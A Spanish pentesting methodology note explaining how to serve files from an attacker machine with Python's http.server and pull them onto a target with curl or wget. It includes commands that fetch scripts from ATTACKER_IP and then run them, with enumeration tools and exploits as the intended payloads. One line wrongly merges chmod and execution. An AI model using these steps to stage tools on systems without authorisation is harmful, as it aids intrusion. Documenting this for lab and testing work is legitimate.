---
title: File Transfer – Python HTTP Server
description: Transferencia de archivos a la máquina objetivo usando un servidor HTTP con Python
tags:
  - linux
  - file-transfer
  - python
  - methodology
---

# File Transfer – Python HTTP Server

Este método permite transferir archivos desde la máquina atacante a la máquina objetivo
utilizando un servidor HTTP sencillo levantado con Python.  
Es una técnica **rápida, fiable y ampliamente disponible** en entornos Linux.

---

## Escenario típico

- La máquina atacante dispone del archivo a transferir (scripts, binarios, exploits).
- La máquina objetivo tiene acceso saliente HTTP.
- No es posible (o no interesa) usar SCP, SFTP u otros métodos autenticados.

Casos de uso comunes:
- Transferir scripts de enumeración (linPEAS, pspy, etc.)
- Subir exploits o herramientas auxiliares
- Descargar binarios compilados previamente

---

## 1. Levantar servidor HTTP en la máquina atacante

Desde el directorio que contiene el archivo a compartir:

```bash
python3 -m http.server 80
```

Esto expone el contenido del directorio actual vía HTTP en el puerto 80.

Notas:
- Requiere permisos si se usa un puerto &lt;1024
- Puede usarse otro puerto si es necesario (ej. `8000`)


```bash
python3 -m http.server 8000
```

---

## 2. Descargar el archivo desde la máquina objetivo

### Usando `curl`

```bash
curl http://ATTACKER_IP/archivo.sh -o archivo.sh
```


Ejemplo:

```bash
curl http://10.10.14.12/linpeas.sh -o linpeas.sh`
```

---

### Usando `wget`

```bash
wget http://ATTACKER_IP/archivo.sh
```

---

## 3. Preparar y ejecutar el archivo (si aplica)

En caso de scripts:

```bash
chmod +x archivo.sh ./archivo.sh
```

---

## Consideraciones de seguridad

- El servidor HTTP **no tiene autenticación**
- Cualquier host con acceso a la IP/puerto puede descargar los archivos
- Se recomienda detener el servidor tras completar la transferencia (`Ctrl + C`)

---

## Alternativas

- `scp` / `sftp` (requieren credenciales)
- `nc` / `socat`
- Base64 + redirección
- SMB temporal

Cada método tiene ventajas según el entorno y restricciones.

---

## Referencias

- [https://docs.python.org/3/library/http.server.html](https://docs.python.org/3/library/http.server.html)